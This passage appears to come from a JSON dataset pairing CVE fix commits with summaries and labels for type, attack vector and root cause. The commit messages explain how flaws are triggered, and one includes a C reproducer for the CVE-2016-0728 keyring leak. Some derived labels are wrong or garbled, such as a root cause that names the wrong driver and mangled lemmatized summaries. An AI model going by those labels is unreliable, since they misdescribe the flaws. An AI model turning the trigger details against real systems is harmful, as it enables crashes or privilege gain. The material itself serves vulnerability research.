Ralf Spenneberg <ralf@spenneberg.net>\nSigned-off-by: Vladis Dronov <vdronov@redhat.com>\nCc: stable@vger.kernel.org\nSigned-off-by: Dmitry Torokhov <dmitry.torokhov@gmail.com>","summary":"The gtco_probe function in drivers\/input\/tablet\/gtco.c in the Linux kernel through 4.5.2 allows physically proximate attackers to cause a denial of service (NULL pointer dereference and system crash) via a crafted endpoints value in a USB device descriptor.","commit_message_1":"gtco - fix crash on detecting device without endpoint the gtco driver expects at least one valid endpoint","Vulnerability Type":"NULL pointer dereference","Attack Vector":"via a crafted endpoints value in a usb device descriptor","Impact":"cause a denial of service ( pointer dereference and system crash )","Root Cause":"caused by a NULL pointer dereference","Attack Type":"local attacker"},{"commit_id":"9c6ba456711687b794dcf285856fc14e2c76074f","cve_id":"CVE-2016-2186","cwe_id":null,"commit_message":"Input: powermate - fix oops with malicious USB descriptors\n\nThe powermate driver expects at least one valid USB endpoint in its\nprobe function.  If given malicious descriptors that specify 0 for\nthe number of endpoints, it will crash.  Validate the number of\nendpoints on the interface before using them.\n\nThe full report for this issue can be found here:\nhttp:\/\/seclists.org\/bugtraq\/2016\/Mar\/85\n\nReported-by: Ralf Spenneberg <ralf@spenneberg.net>\nCc: stable <stable@vger.kernel.org>\nSigned-off-by: Josh Boyer <jwboyer@fedoraproject.org>\nSigned-off-by: Dmitry Torokhov <dmitry.torokhov@gmail.com>","summary":"The powermate_probe function in drivers\/input\/misc\/powermate.c in the Linux kernel before 4.5.1 allows physically proximate attackers to cause a denial of service (NULL pointer dereference and system crash) via a crafted endpoints value in a USB device descriptor.","commit_message_1":"powermate - fix oops with malicious usb descriptor the powermate driver expects at least one valid usb endpoint in it probe function","Vulnerability Type":"NULL pointer dereference","Attack Vector":"via a crafted endpoints value in a usb device descriptor","Impact":"cause a denial of service ( pointer dereference and system crash )","Root Cause":"caused by an error on invalid USB device descriptors (powermate driver)","Attack Type":"local attacker"},{"commit_id":"950336ba3e4a1ffd2ca60d29f6ef386dd2c7351d","cve_id":"CVE-2016-2185","cwe_id":null,"commit_message":"Input: ati_remote2 - fix crashes on detecting device with invalid descriptor\n\nThe ati_remote2 driver expects at least two interfaces with one\nendpoint each. If given malicious descriptor that specify one\ninterface or no endpoints, it will crash in the probe function.\nEnsure there is at least two interfaces and one endpoint for each\ninterface before using it.\n\nThe full disclosure: http:\/\/seclists.org\/bugtraq\/2016\/Mar\/90\n\nReported-by: Ralf Spenneberg <ralf@spenneberg.net>\nSigned-off-by: Vladis Dronov <vdronov@redhat.com>\nCc: stable@vger.kernel.org\nSigned-off-by: Dmitry Torokhov <dmitry.torokhov@gmail.com>","summary":"The ati_remote2_probe function in drivers\/input\/misc\/ati_remote2.c in the Linux kernel before 4.5.1 allows physically proximate attackers to cause a denial of service (NULL pointer dereference and system crash) via a crafted endpoints value in a USB device descriptor.","commit_message_1":"ati_remote2 - fix crash on detecting device with invalid descriptor the ati_remote2 driver expects at least two interface with one endpoint each","Vulnerability Type":"NULL pointer dereference","Attack Vector":"via a crafted endpoints value in a usb device descriptor","Impact":"cause a denial of service ( pointer dereference and system crash )","Root Cause":"caused by an error on invalid USB device descriptors (powermate driver)","Attack Type":"local attacker"},{"commit_id":"0f886ca12765d20124bd06291c82951fd49a33be","cve_id":"CVE-2016-2184","cwe_id":null,"commit_message":"ALSA: usb-audio: Fix NULL dereference in create_fixed_stream_quirk()\n\ncreate_fixed_stream_quirk() may cause a NULL-pointer dereference by\naccessing the non-existing endpoint when a USB device with a malformed\nUSB descriptor is used.\n\nThis patch avoids it simply by adding a sanity check of bNumEndpoints\nbefore the accesses.\n\nBugzilla: https:\/\/bugzilla.suse.com\/show_bug.cgi?id=971125\nCc: <stable@vger.kernel.org>\nSigned-off-by: Takashi Iwai <tiwai@suse.de>","summary":"The create_fixed_stream_quirk function in sound\/usb\/quirks.c in the snd-usb-audio driver in the Linux kernel before 4.5.1 allows physically proximate attackers to cause a denial of service (NULL pointer dereference or double free, and system crash) via a crafted endpoints value in a USB device descriptor.","commit_message_1":"usb-audio : fix null dereference in create_fixed_stream_quirk ( ) create_fixed_stream_quirk ( ) may cause a null-pointer dereference by accessing the non-existing endpoint when a usb device with a malformed usb descriptor is used","Vulnerability Type":"NULL pointer dereference","Attack Vector":"via a crafted endpoints value in a usb device descriptor","Impact":"cause a denial of service ( pointer dereference or double free , and system crash )","Root Cause":"caused by an error on invalid USB device descriptors (snd-usb-audio driver)","Attack Type":"local attacker"},{"commit_id":"0ed26acce328ec16a3aa635f1ca37365e8c7403a","cve_id":"CVE-2016-2180","cwe_id":"CWE-125","commit_message":"Fix OOB read in TS_OBJ_print_bio().\n\nTS_OBJ_print_bio() misuses OBJ_txt2obj: it should print the result\nas a null terminated buffer. The length value returned is the total\nlength the complete text reprsentation would need not the amount of\ndata written.\n\nCVE-2016-2180\n\nThanks to Shi Lei for reporting this bug.\n\nReviewed-by: Matt Caswell <matt@openssl.org>","summary":"The TS_OBJ_print_bio function in crypto\/ts\/ts_lib.c in the X.509 Public Key Infrastructure Time-Stamp Protocol (TSP) implementation in OpenSSL through 1.0.2h allows remote attackers to cause a denial of service (out-of-bounds read and application crash) via a crafted time-stamp file that is mishandled by the *openssl ts* command.","commit_message_1":"fix oob read in ts_obj_print_bio ( )","Vulnerability Type":"Out-of-bounds Read","Attack Vector":"via a crafted time - stamp file that is mishandled by the * openssl ts * command","Impact":"cause a denial of service ( out - of - bounds read and application crash )","Root Cause":"caused by an out-of-bounds read","Attack Type":"remote attacker"},{"commit_id":"3446c13b268af86391d06611327006b059b8bab1","cve_id":"CVE-2016-2143","cwe_id":"CWE-20","commit_message":"s390\/mm: four page table levels vs. fork\n\nThe fork of a process with four page table levels is broken since\ngit commit 6252d702c5311ce9 \"[S390] dynamic page tables.\"\n\nAll new mm contexts are created with three page table levels and\nan asce limit of 4TB. If the parent has four levels dup_mmap will\nadd vmas to the new context which are outside of the asce limit.\nThe subsequent call to copy_page_range will walk the three level\npage table structure of the new process with non-zero pgd and pud\nindexes. This leads to memory clobbers as the pgd_index *and* the\npud_index is added to the mm->pgd pointer without a pgd_deref\nin between.\n\nThe init_new_context() function is selecting the number of page\ntable levels for a new context. The function is used by mm_init()\nwhich in turn is called by dup_mm() and mm_alloc(). These two are\nused by fork() and exec(). The init_new_context() function can\ndistinguish the two cases by looking at mm->context.asce_limit,\nfor fork() the mm struct has been copied and the number of page\ntable levels may not change. For exec() the mm_alloc() function\nset the new mm structure to zero, in this case a three-level page\ntable is created as the temporary stack space is located at\nSTACK_TOP_MAX = 4TB.\n\nThis fixes CVE-2016-2143.\n\nReported-by: Marcin Ko\u015bcielnicki <koriakin@0x04.net>\nReviewed-by: Heiko Carstens <heiko.carstens@de.ibm.com>\nCc: stable@vger.kernel.org\nSigned-off-by: Martin Schwidefsky <schwidefsky@de.ibm.com>","summary":"The fork implementation in the Linux kernel before 4.5 on s390 platforms mishandles the case of four page-table levels, which allows local users to cause a denial of service (system crash) or possibly have unspecified other impact via a crafted application, related to arch\/s390\/include\/asm\/mmu_context.h and arch\/s390\/include\/asm\/pgalloc.h.","commit_message_1":"four page table level v","Vulnerability Type":"Improper Input Validation","Attack Vector":"via a crafted application , related to arch \/ s390 \/ include \/ asm \/ mmu _ context . h and arch \/ s390 \/ include \/ asm \/ pgalloc . h","Impact":"cause a denial of service ( system crash ) or possibly have unspecified other impact","Root Cause":"caused by the improper handling of the case of four page-table levels by the fork implementation","Attack Type":"local attacker"},{"commit_id":"f43bfaeddc79effbf3d0fcb53ca477cca66f3db8","cve_id":"CVE-2016-2117","cwe_id":"CWE-200","commit_message":"atl2: Disable unimplemented scatter\/gather feature\n\natl2 includes NETIF_F_SG in hw_features even though it has no support\nfor non-linear skbs.  This bug was originally harmless since the\ndriver does not claim to implement checksum offload and that used to\nbe a requirement for SG.\n\nNow that SG and checksum offload are independent features, if you\nexplicitly enable SG *and* use one of the rare protocols that can use\nSG without checkusm offload, this potentially leaks sensitive\ninformation (before you notice that it just isn't working).  Therefore\nthis obscure bug has been designated CVE-2016-2117.\n\nReported-by: Justin Yackoski <jyackoski@crypto-nite.com>\nSigned-off-by: Ben Hutchings <ben@decadent.org.uk>\nFixes: ec5f06156423 (\"net: Kill link between CSUM and SG features.\")\nSigned-off-by: David S. Miller <davem@davemloft.net>","summary":"The atl2_probe function in drivers\/net\/ethernet\/atheros\/atlx\/atl2.c in the Linux kernel through 4.5.2 incorrectly enables scatter\/gather I\/O, which allows remote attackers to obtain sensitive information from kernel memory by reading packet data.","commit_message_1":"disable unimplemented scatter\/gather feature atl2 includes netif_f_sg in hw_features even though it ha no support for non-linear skbs","Vulnerability Type":"Exposure of Sensitive Information to an Unauthorized Actor","Attack Vector":"by reading packet data","Impact":"obtain sensitive information from kernel memory","Root Cause":"enables scatter \/ gather i \/ o","Attack Type":"remote attacker"},{"commit_id":"613317bd212c585c20796c10afe5daaa95d4b0a1","cve_id":"CVE-2016-2085","cwe_id":"CWE-19","commit_message":"EVM: Use crypto_memneq() for digest comparisons\n\nThis patch fixes vulnerability CVE-2016-2085.  The problem exists\nbecause the vm_verify_hmac() function includes a use of memcmp().\nUnfortunately, this allows timing side channel attacks; specifically\na MAC forgery complexity drop from 2^128 to 2^12.  This patch changes\nthe memcmp() to the cryptographically safe crypto_memneq().\n\nReported-by: Xiaofei Rex Guo <xiaofei.rex.guo@intel.com>\nSigned-off-by: Ryan Ware <ware@linux.intel.com>\nCc: stable@vger.kernel.org\nSigned-off-by: Mimi Zohar <zohar@linux.vnet.ibm.com>\nSigned-off-by: James Morris <james.l.morris@oracle.com>","summary":"The evm_verify_hmac function in security\/integrity\/evm\/evm_main.c in the Linux kernel before 4.5 does not properly copy data, which makes it easier for local users to forge MAC values via a timing side-channel attack.","commit_message_1":"use crypto_memneq ( ) for digest comparison this patch fix vulnerability <cve_id>","Vulnerability Type":"Data Processing Errors","Attack Vector":"via a timing side - channel attack","Impact":"bypass security restrictions","Root Cause":"caused by the failure to properly copy data by the evm_verify_hmac function","Attack Type":"local attacker"},{"commit_id":"8b8a321ff72c785ed5e8b4cf6eda20b35d427390","cve_id":"CVE-2016-2070","cwe_id":"CWE-189","commit_message":"tcp: fix zero cwnd in tcp_cwnd_reduction\n\nPatch 3759824da87b (\"tcp: PRR uses CRB mode by default and SS mode\nconditionally\") introduced a bug that cwnd may become 0 when both\ninflight and sndcnt are 0 (cwnd = inflight + sndcnt). This may lead\nto a div-by-zero if the connection starts another cwnd reduction\nphase by setting tp->prior_cwnd to the current cwnd (0) in\ntcp_init_cwnd_reduction().\n\nTo prevent this we skip PRR operation when nothing is acked or\nsacked. Then cwnd must be positive in all cases as long as ssthresh\nis positive:\n\n1) The proportional reduction mode\n   inflight > ssthresh > 0\n\n2) The reduction bound mode\n  a) inflight == ssthresh > 0\n\n  b) inflight < ssthresh\n     sndcnt > 0 since newly_acked_sacked > 0 and inflight < ssthresh\n\nTherefore in all cases inflight and sndcnt can not both be 0.\nWe check invalid tp->prior_cwnd to avoid potential div0 bugs.\n\nIn reality this bug is triggered only with a sequence of less common\nevents.  For example, the connection is terminating an ECN-triggered\ncwnd reduction with an inflight 0, then it receives reordered\/old\nACKs or DSACKs from prior transmission (which acks nothing). Or the\nconnection is in fast recovery stage that marks everything lost,\nbut fails to retransmit due to local issues, then receives data\npackets from other end which acks nothing.\n\nFixes: 3759824da87b (\"tcp: PRR uses CRB mode by default and SS mode conditionally\")\nReported-by: Oleksandr Natalenko <oleksandr@natalenko.name>\nSigned-off-by: Yuchung Cheng <ycheng@google.com>\nSigned-off-by: Neal Cardwell <ncardwell@google.com>\nSigned-off-by: Eric Dumazet <edumazet@google.com>\nSigned-off-by: David S. Miller <davem@davemloft.net>","summary":"The tcp_cwnd_reduction function in net\/ipv4\/tcp_input.c in the Linux kernel before 4.3.5 allows remote attackers to cause a denial of service (divide-by-zero error and system crash) via crafted TCP traffic.","commit_message_1":"fix zero cwnd in tcp_cwnd_reduction patch 3759824da87b ( `` tcp : prr us crb mode by default and s mode conditionally '' ) introduced a bug that cwnd may become <number> when both inflight and sndcnt are <number> ( cwnd = inflight + sndcnt )","Vulnerability Type":"Numeric Errors","Attack Vector":"via crafted tcp traffic","Impact":"cause a denial of service ( divide - by - zero error and system crash )","Root Cause":"caused by a divide-by-zero error","Attack Type":"remote attacker"},{"commit_id":"71b3c126e61177eb693423f2e18a1914205b165e","cve_id":"CVE-2016-2069","cwe_id":"CWE-362","commit_message":"x86\/mm: Add barriers and document switch_mm()-vs-flush synchronization\n\nWhen switch_mm() activates a new PGD, it also sets a bit that\ntells other CPUs that the PGD is in use so that TLB flush IPIs\nwill be sent.  In order for that to work correctly, the bit\nneeds to be visible prior to loading the PGD and therefore\nstarting to fill the local TLB.\n\nDocument all the barriers that make this work correctly and add\na couple that were missing.\n\nSigned-off-by: Andy Lutomirski <luto@kernel.org>\nCc: Andrew Morton <akpm@linux-foundation.org>\nCc: Andy Lutomirski <luto@amacapital.net>\nCc: Borislav Petkov <bp@alien8.de>\nCc: Brian Gerst <brgerst@gmail.com>\nCc: Dave Hansen <dave.hansen@linux.intel.com>\nCc: Denys Vlasenko <dvlasenk@redhat.com>\nCc: H. Peter Anvin <hpa@zytor.com>\nCc: Linus Torvalds <torvalds@linux-foundation.org>\nCc: Peter Zijlstra <peterz@infradead.org>\nCc: Rik van Riel <riel@redhat.com>\nCc: Thomas Gleixner <tglx@linutronix.de>\nCc: linux-mm@kvack.org\nCc: stable@vger.kernel.org\nSigned-off-by: Ingo Molnar <mingo@kernel.org>","summary":"Race condition in arch\/x86\/mm\/tlb.c in the Linux kernel before 4.4.1 allows local users to gain privileges by triggering access to a paging structure by a different CPU.","commit_message_1":"add barrier and document switch_mm ( ) -vs-flush synchronization when switch_mm ( ) activates a new pgd , it also set a bit that tell other cpu that the pgd is in use so that tlb flush ipis will be sent","Vulnerability Type":"Race Condition","Attack Vector":"by triggering access to a paging structure by a different cpu","Impact":"gain privileges","Root Cause":"caused by a race condition","Attack Type":"local attacker"},{"commit_id":"0d62e9dd6da45bbf0f33a8617afc5fe774c8f45f","cve_id":"CVE-2016-2053","cwe_id":"CWE-310","commit_message":"ASN.1: Fix non-match detection failure on data overrun\n\nIf the ASN.1 decoder is asked to parse a sequence of objects, non-optional\nmatches get skipped if there's no more data to be had rather than a\ndata-overrun error being reported.\n\nThis is due to the code segment that decides whether to skip optional\nmatches (ie. matches that could get ignored because an element is marked\nOPTIONAL in the grammar) due to a lack of data also skips non-optional\nelements if the data pointer has reached the end of the buffer.\n\nThis can be tested with the data decoder for the new RSA akcipher algorithm\nthat takes three non-optional integers.  Currently, it skips the last\ninteger if there is insufficient data.\n\nWithout the fix, #defining DEBUG in asn1_decoder.c will show something\nlike:\n\n\tnext_op: pc=0\/13 dp=0\/270 C=0 J=0\n\t- match? 30 30 00\n\t- TAG: 30 266 CONS\n\tnext_op: pc=2\/13 dp=4\/270 C=1 J=0\n\t- match? 02 02 00\n\t- TAG: 02 257\n\t- LEAF: 257\n\tnext_op: pc=5\/13 dp=265\/270 C=1 J=0\n\t- match? 02 02 00\n\t- TAG: 02 3\n\t- LEAF: 3\n\tnext_op: pc=8\/13 dp=270\/270 C=1 J=0\n\tnext_op: pc=11\/13 dp=270\/270 C=1 J=0\n\t- end cons t=4 dp=270 l=270\/270\n\nThe next_op line for pc=8\/13 should be followed by a match line.\n\nThis is not exploitable for X.509 certificates by means of shortening the\nmessage and fixing up the ASN.1 CONS tags because:\n\n (1) The relevant records being built up are cleared before use.\n\n (2) If the message is shortened sufficiently to remove the public key, the\n     ASN.1 parse of the RSA key will fail quickly due to a lack of data.\n\n (3) Extracted signature data is either turned into MPIs (which cope with a\n     0 length) or is simpler integers specifying algoritms and suchlike\n     (which can validly be 0); and\n\n (4) The AKID and SKID extensions are optional and their removal is handled\n     without risking passing a NULL to asymmetric_key_generate_id().\n\n (5) If the certificate is truncated sufficiently to remove the subject,\n     issuer or serialNumber then the ASN.1 decoder will fail with a 'Cons\n     stack underflow' return.\n\nThis is not exploitable for PKCS#7 messages by means of removal of elements\nfrom such a message from the tail end of a sequence:\n\n (1) Any shortened X.509 certs embedded in the PKCS#7 message are survivable\n     as detailed above.\n\n (2) The message digest content isn't used if it shows a NULL pointer,\n     similarly, the authattrs aren't used if that shows a NULL pointer.\n\n (3) A missing signature results in a NULL MPI - which the MPI routines deal\n     with.\n\n (4) If data is NULL, it is expected that the message has detached content and\n     that is handled appropriately.\n\n (5) If the serialNumber is excised, the unconditional action associated\n     with it will pick up the containing SEQUENCE instead, so no NULL\n     pointer will be seen here.\n\n     If both the issuer and the serialNumber are excised, the ASN.1 decode\n     will fail with an 'Unexpected tag' return.\n\n     In either case, there's no way to get to asymmetric_key_generate_id()\n     with a NULL pointer.\n\n (6) Other fields are decoded to simple integers.  Shortening the message\n     to omit an algorithm ID field will cause checks on this to fail early\n     in the verification process.\n\n\nThis can also be tested by snipping objects off of the end of the ASN.1 stream\nsuch that mandatory tags are removed - or even from the end of internal\nSEQUENCEs.  If any mandatory tag is missing, the error EBADMSG *should* be\nproduced.  Without this patch ERANGE or ENOPKG might be produced or the parse\nmay apparently succeed, perhaps with ENOKEY or EKEYREJECTED being produced\nlater, depending on what gets snipped.\n\nJust snipping off the final BIT_STRING or OCTET_STRING from either sample\nshould be a start since both are mandatory and neither will cause an EBADMSG\nwithout the patches\n\nReported-by: Marcel Holtmann <marcel@holtmann.org>\nSigned-off-by: David Howells <dhowells@redhat.com>\nTested-by: Marcel Holtmann <marcel@holtmann.org>\nReviewed-by: David Woodhouse <David.Woodhouse@intel.com>","summary":"The asn1_ber_decoder function in lib\/asn1_decoder.c in the Linux kernel before 4.3 allows attackers to cause a denial of service (panic) via an ASN.1 BER file that lacks a public key, leading to mishandling by the public_key_verify_signature function in crypto\/asymmetric_keys\/public_key.c.","commit_message_1":"fix non-match detection failure on data overrun if the <file> decoder is asked to parse a sequence of object , non-optional match get skipped if there 's no more data to be had rather than a data-overrun error being reported","Vulnerability Type":"Cryptographic Issues","Attack Vector":"via an asn . 1 ber file that lacks a public key , leading to mishandling by the public _ key _ verify _ signature function in crypto \/ asymmetric _ keys \/ public _ key . c","Impact":"cause a denial of service","Root Cause":"caused by an error","Attack Type":"remote attacker"},{"commit_id":"63ef0b41dc48d6112d1918c1b1de9de8ea90adb5","cve_id":"CVE-2016-2052","cwe_id":null,"commit_message":"[ot-font] Fix hmtx wrong table length check\n\nDiscovered by libFuzzer.  Ouch!\n\nhttps:\/\/github.com\/behdad\/harfbuzz\/issues\/139#issuecomment-148289957","summary":"Multiple unspecified vulnerabilities in HarfBuzz before 1.0.6, as used in Google Chrome before 48.0.2564.82, allow attackers to cause a denial of service or possibly have other impact via crafted data, as demonstrated by a buffer over-read resulting from an inverted length check in hb-ot-font.cc, a different issue than CVE-2015-8947.","commit_message_1":"fix hmtx wrong table length check discovered by libfuzzer","Vulnerability Type":"multiple unspecified","Attack Vector":"via crafted data , as demonstrated by a buffer over - read resulting from an inverted length check in hb - ot - font . cc , a different issue than cve - 2015 - 8947","Impact":"cause a denial of service or possibly have other impact","Root Cause":"demonstrated by a buffer over-read resulting from an inverted length check","Attack Type":"local attacker"},{"commit_id":"2871c70efaaaa0f102557a17c727fd4d5204dd4b","cve_id":"CVE-2016-1904","cwe_id":"CWE-189","commit_message":"Patch for Heap Buffer Overflow in EscapeShell\n\nProposed patch for bug #71270","summary":"Multiple integer overflows in ext\/standard\/exec.c in PHP 7.x before 7.0.2 allow remote attackers to cause a denial of service or possibly have unspecified other impact via a long string to the (1) php_escape_shell_cmd or (2) php_escape_shell_arg function, leading to a heap-based buffer overflow.","commit_message_1":"patch for heap buffer overflow in escapeshell","Vulnerability Type":"multiple integer overflow","Attack Vector":"via a long string to the ( 1 ) php _ escape _ shell _ cmd or ( 2 ) php _ escape _ shell _ arg function , leading to a heap - based buffer overflow","Impact":"cause a denial of service or possibly have unspecified other impact","Root Cause":"caused by improper bounds checking by the escapeshell() functions","Attack Type":"remote attacker"},{"commit_id":"f5364c150aa645b3d7daa21b5c0b9feaa1c9cd6d","cve_id":"CVE-2016-1583","cwe_id":"CWE-119","commit_message":"Merge branch 'stacking-fixes' (vfs stacking fixes from Jann)\n\nMerge filesystem stacking fixes from Jann Horn.\n\n* emailed patches from Jann Horn <jannh@google.com>:\n  sched: panic on corrupted stack end\n  ecryptfs: forbid opening files without mmap handler\n  proc: prevent stacking filesystems on top","summary":"The ecryptfs_privileged_open function in fs\/ecryptfs\/kthread.c in the Linux kernel before 4.6.3 allows local users to gain privileges or cause a denial of service (stack memory consumption) via vectors involving crafted mmap calls for \/proc pathnames, leading to recursive pagefault handling.","commit_message_1":"merge branch 'stacking-fixes ' ( vfs stacking fix from jann ) merge filesystem stacking fix from jann horn","Vulnerability Type":"buffer overflow","Attack Vector":"via vectors involving crafted mmap calls for \/ proc pathnames , leading to recursive pagefault handling","Impact":"gain privileges or cause a denial of service ( stack memory consumption )","Root Cause":"caused by improper bounds checking by the ecryptfs mechanism","Attack Type":"local attacker"},{"commit_id":"d0331e8e5b05b475f20b1f3101fe1ad772d7e7e7","cve_id":"CVE-2016-1541","cwe_id":"CWE-20","commit_message":"Issue #656:  Fix CVE-2016-1541, VU#862384\n\nWhen reading OS X metadata entries in Zip archives that were stored\nwithout compression, libarchive would use the uncompressed entry size\nto allocate a buffer but would use the compressed entry size to limit\nthe amount of data copied into that buffer.  Since the compressed\nand uncompressed sizes are provided by data in the archive itself,\nan attacker could manipulate these values to write data beyond\nthe end of the allocated buffer.\n\nThis fix provides three new checks to guard against such\nmanipulation and to make libarchive generally more robust when\nhandling this type of entry:\n 1. If an OS X metadata entry is stored without compression,\n    abort the entire archive if the compressed and uncompressed\n    data sizes do not match.\n 2. When sanity-checking the size of an OS X metadata entry,\n    abort this entry if either the compressed or uncompressed\n    size is larger than 4MB.\n 3. When copying data into the allocated buffer, check the copy\n    size against both the compressed entry size and uncompressed\n    entry size.","summary":"Heap-based buffer overflow in the zip_read_mac_metadata function in archive_read_support_format_zip.c in libarchive before 3.2.0 allows remote attackers to execute arbitrary code via crafted entry-size values in a ZIP archive.","commit_message_1":"fix <cve_id> , vu # <number> when reading o x metadata entry in zip archive that were stored without compression , libarchive would use the uncompressed entry size to allocate a buffer but would use the compressed entry size to limit the amount of data copied into that buffer","Vulnerability Type":"Improper Input Validation","Attack Vector":"via crafted entry - size values in a zip archive","Impact":"execute arbitrary code","Root Cause":"Heap-based buffer overflow","Attack Type":"remote attacker"},{"commit_id":"999653786df6954a31044528ac3f7a5dadca08f4","cve_id":"CVE-2016-1237","cwe_id":"CWE-284","commit_message":"nfsd: check permissions when setting ACLs\n\nUse set_posix_acl, which includes proper permission checks, instead of\ncalling ->set_acl directly.  Without this anyone may be able to grant\nthemselves permissions to a file by setting the ACL.\n\nLock the inode to make the new checks atomic with respect to set_acl.\n(Also, nfsd was the only caller of set_acl not locking the inode, so I\nsuspect this may fix other races.)\n\nThis also simplifies the code, and ensures our ACLs are checked by\nposix_acl_valid.\n\nThe permission checks and the inode locking were lost with commit\n4ac7249e, which changed nfsd to use the set_acl inode operation directly\ninstead of going through xattr handlers.\n\nReported-by: David Sinquin <david@sinquin.eu>\n[agreunba@redhat.com: use set_posix_acl]\nFixes: 4ac7249e\nCc: Christoph Hellwig <hch@infradead.org>\nCc: Al Viro <viro@zeniv.linux.org.uk>\nCc: stable@vger.kernel.org\nSigned-off-by: J. Bruce Fields <bfields@redhat.com>","summary":"nfsd in the Linux kernel through 4.6.3 allows local users to bypass intended file-permission restrictions by setting a POSIX ACL, related to nfs2acl.c, nfs3acl.c, and nfs4acl.c.","commit_message_1":"check permission when setting acls use set_posix_acl , which includes proper permission check , instead of calling - > set_acl directly","Vulnerability Type":"Improper Access Control","Attack Vector":"by setting a posix acl , related to nfs2acl . c , nfs3acl . c , and nfs4acl . c","Impact":"gain elevated privileges","Root Cause":"caused by the failure to check permissions when setting ACLs by nfsd","Attack Type":"local attacker"},{"commit_id":"ab676b7d6fbf4b294bf198fb27ade5b0e865c7ce","cve_id":"CVE-2016-0823","cwe_id":"CWE-200","commit_message":"pagemap: do not leak physical addresses to non-privileged userspace\n\nAs pointed by recent post[1] on exploiting DRAM physical imperfection,\n\/proc\/PID\/pagemap exposes sensitive information which can be used to do\nattacks.\n\nThis disallows anybody without CAP_SYS_ADMIN to read the pagemap.\n\n[1] http:\/\/googleprojectzero.blogspot.com\/2015\/03\/exploiting-dram-rowhammer-bug-to-gain.html\n\n[ Eventually we might want to do anything more finegrained, but for now\n  this is the simple model.   - Linus ]\n\nSigned-off-by: Kirill A. Shutemov <kirill.shutemov@linux.intel.com>\nAcked-by: Konstantin Khlebnikov <khlebnikov@openvz.org>\nAcked-by: Andy Lutomirski <luto@amacapital.net>\nCc: Pavel Emelyanov <xemul@parallels.com>\nCc: Andrew Morton <akpm@linux-foundation.org>\nCc: Mark Seaborn <mseaborn@chromium.org>\nCc: stable@vger.kernel.org\nSigned-off-by: Linus Torvalds <torvalds@linux-foundation.org>","summary":"The pagemap_open function in fs\/proc\/task_mmu.c in the Linux kernel before 3.19.3, as used in Android 6.0.1 before 2016-03-01, allows local users to obtain sensitive physical-address information by reading a pagemap file, aka Android internal bug 25739721.","commit_message_1":"do not leak physical address to non-privileged userspace a pointed by recent post [ <number> ] on exploiting dram physical imperfection , \/proc\/pid\/pagemap expose sensitive information which can be used to do attack","Vulnerability Type":"Exposure of Sensitive Information to an Unauthorized Actor","Attack Vector":"by reading a pagemap file , aka android internal bug 25739721","Impact":"obtain sensitive physical - address information","Root Cause":"caused by an error","Attack Type":"local attacker"},{"commit_id":"23c8a812dc3c621009e4f0e5342aa4e2ede1ceaa","cve_id":"CVE-2016-0758","cwe_id":null,"commit_message":"KEYS: Fix ASN.1 indefinite length object parsing\n\nThis fixes CVE-2016-0758.\n\nIn the ASN.1 decoder, when the length field of an ASN.1 value is extracted,\nit isn't validated against the remaining amount of data before being added\nto the cursor.  With a sufficiently large size indicated, the check:\n\n\tdatalen - dp < 2\n\nmay then fail due to integer overflow.\n\nFix this by checking the length indicated against the amount of remaining\ndata in both places a definite length is determined.\n\nWhilst we're at it, make the following changes:\n\n (1) Check the maximum size of extended length does not exceed the capacity\n     of the variable it's being stored in (len) rather than the type that\n     variable is assumed to be (size_t).\n\n (2) Compare the EOC tag to the symbolic constant ASN1_EOC rather than the\n     integer 0.\n\n (3) To reduce confusion, move the initialisation of len outside of:\n\n\tfor (len = 0; n > 0; n--) {\n\n     since it doesn't have anything to do with the loop counter n.\n\nSigned-off-by: David Howells <dhowells@redhat.com>\nReviewed-by: Mimi Zohar <zohar@linux.vnet.ibm.com>\nAcked-by: David Woodhouse <David.Woodhouse@intel.com>\nAcked-by: Peter Jones <pjones@redhat.com>","summary":"Integer overflow in lib\/asn1_decoder.c in the Linux kernel before 4.6 allows local users to gain privileges via crafted ASN.1 data.","commit_message_1":"fix <file> indefinite length object parsing this fix <cve_id>","Vulnerability Type":"integer overflow","Attack Vector":"via crafted asn . 1 data","Impact":"gain privileges","Root Cause":"caused by the improper processing of certificate files with tags with indefinite length by the ASN.1 DER decoder","Attack Type":"local attacker"},{"commit_id":"23567fd052a9abb6d67fe8e7a9ccdd9800a540f2","cve_id":"CVE-2016-0728","cwe_id":null,"commit_message":"KEYS: Fix keyring ref leak in join_session_keyring()\n\nThis fixes CVE-2016-0728.\n\nIf a thread is asked to join as a session keyring the keyring that's already\nset as its session, we leak a keyring reference.\n\nThis can be tested with the following program:\n\n\t#include <stddef.h>\n\t#include <stdio.h>\n\t#include <sys\/types.h>\n\t#include <keyutils.h>\n\n\tint main(int argc, const char *argv[])\n\t{\n\t\tint i = 0;\n\t\tkey_serial_t serial;\n\n\t\tserial = keyctl(KEYCTL_JOIN_SESSION_KEYRING,\n\t\t\t\t\"leaked-keyring\");\n\t\tif (serial < 0) {\n\t\t\tperror(\"keyctl\");\n\t\t\treturn -1;\n\t\t}\n\n\t\tif (keyctl(KEYCTL_SETPERM, serial,\n\t\t\t   KEY_POS_ALL | KEY_USR_ALL) < 0) {\n\t\t\tperror(\"keyctl\");\n\t\t\treturn -1;\n\t\t}\n\n\t\tfor (i = 0; i < 100; i++) {\n\t\t\tserial = keyctl(KEYCTL_JOIN_SESSION_KEYRING,\n\t\t\t\t\t\"leaked-keyring\");\n\t\t\tif (serial < 0) {\n\t\t\t\tperror(\"keyctl\");\n\t\t\t\treturn -1;\n\t\t\t}\n\t\t}\n\n\t\treturn 0;\n\t}\n\nIf, after the program has run, there something like the following line in\n\/proc\/keys:\n\n3f3d898f I--Q---   100 perm 3f3f0000     0     0 keyring   leaked-keyring: empty\n\nwith a usage count of 100 * the number of times the program has been run,\nthen the kernel is malfunctioning.  If leaked-keyring has zero usages or\nhas been garbage collected, then the problem is fixed.\n\nReported-by: Yevgeny Pats <yevgeny@perception-point.io>\nSigned-off-by: David Howells <dhowells@redhat.com>\nAcked-by: Don Zickus <dzickus@redhat.com>\nAcked-by: Prarit Bhargava <prarit@redhat.com>\nAcked-by: Jarod Wilson <jarod@redhat.com>\nSigned-off-by: James Morris <james.l.morris@oracle.com>","summary":"The join_session_keyring function in security\/keys\/process_keys.c in the Linux kernel before 4.4.1 mishandles object references in a certain error case, which allows local users to gain privileges or cause a denial of service (integer overflow and use-after-free) via crafted keyctl commands.","commit_message_1":"fix keyring ref leak in join_session_keyring ( ) this fix <cve_id>","Vulnerability Type":"integer overflow and use-after-free","Attack Vector":"via crafted keyctl commands","Impact":"gain privileges or cause a denial of service ( integer overflow and use - after - free )","Root Cause":"caused by a use-after-free","Attack Type":"local 